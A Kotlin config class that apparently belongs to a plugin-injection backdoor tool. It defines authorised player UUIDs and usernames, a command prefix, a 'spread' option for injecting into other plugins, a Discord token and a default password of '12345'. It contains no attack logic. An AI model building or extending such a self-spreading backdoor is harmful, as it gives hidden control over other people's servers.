package com.tmquan2508.inject.config

import com.google.gson.annotations.SerializedName

data class Config(
    @SerializedName("uuids")
    val authorizedUuids: List<String> = emptyList(),

    @SerializedName("usernames")
    val authorizedUsernames: List<String> = emptyList(),

    @SerializedName("prefix")
    val commandPrefix: String = "!",

    @SerializedName("spread")
    val injectIntoOtherPlugins: Boolean = false,

    @SerializedName("warnings")
    val displayDebugMessages: Boolean = false,

    @SerializedName("discord_token")
    val discordToken: String = "",

    @SerializedName("password")
    val password: String = "12345"
)